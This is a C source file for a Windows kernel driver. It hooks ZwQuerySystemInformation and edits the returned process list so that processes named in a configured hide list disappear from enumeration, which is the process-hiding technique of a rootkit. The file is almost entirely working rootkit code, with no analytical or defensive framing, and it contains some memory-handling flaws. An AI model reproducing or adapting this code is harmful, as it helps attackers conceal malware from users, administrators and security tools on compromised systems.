#include "ntddk.h"
#include "stdio.h"
#include "stdlib.h"
#include "cfg.h"

typedef unsigned char BYTE, *PBYTE;

ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformationAddress = NULL;

LONGLONG UserTime=0, KernelTime=0;

NTSTATUS HookOfZwQuerySystemInformation(
            IN ULONG SystemInformationClass,
            IN PVOID SystemInformation,
            IN ULONG SystemInformationLength,
            OUT PULONG ReturnLength)
{
	NTSTATUS status;
	PSYSTEM_PROCESS_INFORMATION curr;
	PSYSTEM_PROCESS_INFORMATION prev;
	ULONG i;
	ANSI_STRING procname;
	
	KdPrint(("HOOK ZWQ"));
	
	status = ((ZWQUERYSYSTEMINFORMATION)(ZwQuerySystemInformationAddress)) (
					SystemInformationClass,
					SystemInformation,
					SystemInformationLength,
					ReturnLength );

	if( !NT_SUCCESS(status) ) 
		return status;
   
	if(SystemInformationClass!=5) // not a process request
		return status;       
   
	for(i=0; i<NbProcessToHide; i++)
	{
		curr = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		prev = NULL;
			 	 
		while(curr)
	  	{
	  		RtlUnicodeStringToAnsiString(&procname, &curr->ProcessName, TRUE);
			procname.Buffer=_strupr(procname.Buffer);
         
         	if (curr->ProcessName.Buffer != NULL)
		 	{                             
			 	KdPrint(("Current proc is %s\n", procname.Buffer));
				          
				if(strcmp(procname.Buffer,ProcessToHide[i])==0)
	            {             
					KdPrint(("HIDE!%s\n",ProcessToHide[i]));
					                                                            
					if(!prev)
			   		{
						// we are first process     
						if(curr->NextEntryDelta) // if there is a process after it
						{
							// first process becomes this one
				        	(PBYTE)SystemInformation += curr->NextEntryDelta;							
						}
						else 
						{
							// no process ! >_>
							SystemInformation = NULL;
						}							
					}
					else
				   	{
						// there was a process before
						if(curr->NextEntryDelta) // if there is a process after
						{
							// previous process leads to next 
							prev->NextEntryDelta += curr->NextEntryDelta;
						}
						else	
						{
							// previous process is the last one =)
			    	     	prev->NextEntryDelta = 0;    
						}			         
				   }	
    	        } 
        	    else
            	{
	            	// not a process to hide, prev ptr go to this process
					prev = curr;  
        	    }               
			}

	         // curr go to next process
    	     if(curr->NextEntryDelta) 
        	    ((PBYTE)curr += curr->NextEntryDelta);
	         else 
    	         curr = NULL;
		}
	}
	
	RtlFreeAnsiString(&procname);
   
	return status;
}
